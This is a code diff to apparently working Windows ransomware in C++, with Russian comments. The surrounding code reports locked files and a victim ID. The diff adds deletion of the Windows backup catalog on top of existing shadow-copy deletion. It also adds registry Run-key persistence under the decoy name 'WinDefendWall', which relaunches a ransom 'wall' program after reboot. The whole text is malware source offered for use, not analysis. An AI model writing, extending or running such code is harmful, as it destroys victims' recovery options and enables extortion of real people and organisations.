@@ -6,6 +6,7 @@
 #include <set>
 #include <string>
 #include <vector>
+#include <windows.h>
 
 namespace fs = std::filesystem;
 
@@ -97,10 +98,26 @@ int wmain(int argc, wchar_t** argv) {
     std::cout << "[+] Files locked: " << n << "\n"
               << "[+] Victim ID: " << id << "\n";
 
+    // Сброс теневых копий
     system("vssadmin delete shadows /all /quiet >nul 2>&1");
+    system("wbadmin delete catalog -quiet >nul 2>&1");
 
+    // --- АВТОЗАПУСК СТЕНЫ ---
+    // Прописываем wall.exe в реестр, чтобы он запускался после перезагрузки
     fs::path self = fs::current_path() / L"wall.exe";
     if (fs::exists(self)) {
+        HKEY hKey;
+        if (RegOpenKeyExW(HKEY_CURRENT_USER, 
+            L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
+            0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
+            
+            RegSetValueExW(hKey, L"WinDefendWall", 0, REG_SZ, 
+                (const BYTE*)self.c_str(), 
+                (DWORD)((self.wstring().size() + 1) * sizeof(wchar_t)));
+            RegCloseKey(hKey);
+        }
+
+        // Запускаем стену прямо сейчас
         STARTUPINFOW si{sizeof(si)};
         PROCESS_INFORMATION pi{};
         CreateProcessW(self.c_str(), nullptr, nullptr, nullptr, FALSE,
@@ -108,5 +125,6 @@ int wmain(int argc, wchar_t** argv) {
         if (pi.hProcess) CloseHandle(pi.hProcess);
         if (pi.hThread)  CloseHandle(pi.hThread);
     }
+
     return 0;
 }
